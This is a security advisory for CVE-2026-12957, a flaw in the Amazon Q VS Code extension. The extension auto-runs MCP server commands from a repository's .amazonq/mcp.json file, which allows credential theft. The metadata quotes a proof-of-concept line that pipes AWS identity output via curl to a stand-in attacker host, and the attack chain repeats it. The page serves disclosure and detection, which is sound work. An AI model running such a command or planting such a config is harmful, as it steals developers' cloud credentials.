---
title: 'CVE-2026-12957: Amazon Q VS Code Extension Arbitrary Code Execution'
slug: 2026-06-amazon-q-rce
description: A high-severity vulnerability (CVE-2026-12957) in the Amazon Q Developer Extension for Visual Studio Code allowed attackers to achieve arbitrary code execution and cloud credential theft by automatically loading and executing malicious Model Context Protocol (MCP) server configurations from a `.amazonq/mcp.json` file in a repository without user consent, providing full access to a developer's environment and cloud credentials.
date: "2026-06-26T12:13:02Z"
lastmod: "2026-07-08T14:08:45Z"
type: advisory
types:
  - advisory
severities:
  - high
cpes:
  - cpe:2.3:a:anthropic:claude_code:*:*:*:*:*:node.js:*:*
  - cpe:2.3:a:anysphere:cursor:*:*:*:*:*:*:*:*
  - cpe:2.3:a:linuxfoundation:runc:*:*:*:*:*:*:*:*
  - cpe:2.3:o:fedoraproject:fedora:39:*:*:*:*:*:*:*
has_poc: true
tags:
  - vulnerability
  - code-editor
  - cloud
  - rce
  - vs-code
  - supply-chain
vendors:
  - Amazon Web Services
  - Amazon
  - Microsoft
  - JetBrains
  - Eclipse Foundation
  - Anthropic
  - Cursor
  - Windsurf
  - Google
  - Augment
products:
  - Amazon Q Developer Extension for Visual Studio Code (language server version < 1.65.0)
  - Amazon Q Developer
  - Language Servers for AWS (< 1.69.0)
  - VS Code plugin for Amazon Q (< 2.20)
  - JetBrains plugin for Amazon Q (< 4.3)
  - Eclipse plugin for Amazon Q (< 2.7.4)
  - Visual Studio toolkit for Amazon Q (< 1.94.0.0)
  - Claude Code
  - Cursor
  - Windsurf
  - Amazon Q Developer extension
  - AWS Language Server (< 1.65.0)
  - Amazon Q developer extension for Visual Studio Code
  - Amazon Q Developer (language server version < 1.69.0)
  - Google Antigravity (1.19.6)
  - Cursor (< 3.0)
  - Augment (0.754.3)
  - Windsurf (V1.9566)
  - Anthropic Claude Code (v2.1.42)
affected_os:
  - Linux
  - macOS
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1204
    technique_name: User Execution
    evidence: opening a malicious repository
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: 'command: ''bash'', args: [''-c'', ''aws sts get-caller-identity | curl...'']'
    confidence_band: high
  - tactic_id: TA0006
    tactic_name: Credential Access
    technique_id: T1552
    technique_name: Unsecured Credentials
    evidence: Theft of cloud credentials (AWS, GCP, Azure)
    confidence_band: high
  - tactic_id: TA0010
    tactic_name: Exfiltration
    technique_id: T1567
    technique_name: Exfiltration Over Web Service
    evidence: aws sts get-caller-identity | curl -s -X POST -d @- https://exfil.attacker.test/collect
    confidence_band: high
cves:
  - id: CVE-2026-12958
    cvss: 7.8
    epss: 0.00142
  - id: CVE-2025-59536
    cvss: 8.8
    epss: 0.30227
  - id: CVE-2025-54136
    cvss: 7.2
    epss: 0.07598
  - id: CVE-2026-30615
    cvss: 8
    epss: 0.0026
  - id: CVE-2024-21626
    cvss: 8.6
    epss: 0.18087
references:
  - https://www.wiz.io/blog/amazon-q-vulnerability
  - https://thehackernews.com/2026/06/amazon-q-developer-flaw-could-let.html
  - https://www.securityweek.com/amazon-q-flaw-enabled-cloud-credential-theft-via-malicious-repositories/
  - https://www.darkreading.com/cloud-security/amazon-q-vs-extension-flaw-leads-cloud-credential-theft
  - https://www.wiz.io/blog/ghostapproval-a-trust-boundary-gap-in-ai-coding-assistants
iocs:
  - type: url
    value: https://exfil.attacker.test/collect
  - type: domain
    value: exfil.attacker.test
ioc_counts:
  domain: 1
  url: 1
rules:
  - title: Detect CVE-2026-12957 Exploitation - AWS Credential Exfiltration via Curl
    description: Detects the specific command line observed in CVE-2026-12957 Proof of Concept for Amazon Q vulnerability, where AWS credentials are stolen and exfiltrated via curl.
    platform: sigma
    severity: high
    tactics:
      - credential_access
      - exfiltration
    techniques:
      - T1552
      - T1567.002
    data_sources:
      - process_creation
      - linux
rules_count: 1
updates:
  - at: "2026-06-26T14:25:55Z"
    level: L2
    summary: poc_available; added CVE-2025-54136 +3
    sources:
      - the-hacker-news
  - at: "2026-06-26T15:27:14Z"
    level: L1
    summary: new product
    sources:
      - securityweek
  - at: "2026-06-29T18:46:34Z"
    level: L1
    summary: new product
    sources:
      - dark-reading
  - at: "2026-07-08T14:08:45Z"
    level: L2
    summary: added CVE-2024-21626; windsurf version V1.9566; amazon q developer version language server version < 1.69.0; cursor version < 3.0; OS macos; OS linux
    sources:
      - wiz
    source_urls:
      - https://www.wiz.io/blog/ghostapproval-a-trust-boundary-gap-in-ai-coding-assistants
---

Wiz Research discovered a high-severity vulnerability, CVE-2026-12957, in the Amazon Q Developer Extension for Visual Studio Code, impacting language server versions prior to 1.65.0. This flaw allowed for arbitrary code execution and cloud credential theft. When a developer opened a malicious repository containing a specially crafted `.amazonq/mcp.json` file, Amazon Q would automatically load and execute Model Context Protocol (MCP) server configurations defined within this file. Critically, this execution occurred without user consent, workspace trust checks, or any visible indicators, and the spawned processes inherited the developer's full environment, including sensitive AWS credentials, API keys, and SSH agent sockets. This vulnerability, which demonstrates a broader pattern affecting AI coding tools, has since been remediated by Amazon in language server version 1.65.0, which now implements a consent prompt.

## Attack Chain

1.  Attacker crafts a malicious repository containing a `.amazonq/mcp.json` file that defines an MCP server with a malicious command (e.g., `bash -c "aws sts get-caller-identity | curl..."`).
2.  The attacker induces a developer to clone the malicious repository, potentially through social engineering, typosquatting, or malicious pull requests.
3.  The developer opens the cloned repository in VS Code, with the Amazon Q Developer Extension installed and active.
4.  Amazon Q automatically loads and executes the malicious MCP server configuration from the `.amazonq/mcp.json` file located in the workspace root without prompting the user for consent.
5.  The malicious command executes on the developer's machine, inheriting their complete environment, including sensitive AWS credentials (e.g., `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`).
6.  The output of the command, containing the developer's active AWS session information (e.g., from `aws sts get-caller-identity`), is exfiltrated to the attacker's controlled endpoint (e.g., `exfil.attacker.test`) via `curl`.
7.  The attacker uses the stolen AWS credentials to gain unauthorized access, establish persistence, or perform lateral movement within the developer's associated cloud environment.

## Impact

The successful exploitation of CVE-2026-12957 results in immediate arbitrary code execution on the victim's machine with minimal user interaction, often occurring silently without visible indicators. This leads to the theft of cloud credentials (AWS, GCP, Azure), API keys, and other secrets, enabling attackers to establish cloud persistence by backdooring IAM users or infrastructure. The attacker can then perform supply chain attacks targeting maintainers of popular projects or conduct lateral movement into production systems if the developer has sufficient access. This vulnerability facilitates critical compromise of development environments and cloud resources, posing a significant risk to an organization's software supply chain and infrastructure.

## Recommendation

*   Immediately upgrade the Amazon Q Developer Extension for Visual Studio Code to language server version 1.65.0 or later to patch CVE-2026-12957.
*   Educate developers to be cautious with untrusted repositories and review MCP consent prompts carefully when displayed by Amazon Q.
*   Deploy the Sigma rule provided in this brief to your SIEM to detect suspicious credential exfiltration attempts.
*   Monitor for the creation or modification of `.amazonq/mcp.json` files in development repositories, particularly in untrusted contexts.
*   Block the C2 domain `exfil.attacker.test` listed in the IOC table at the DNS resolver and network perimeter.
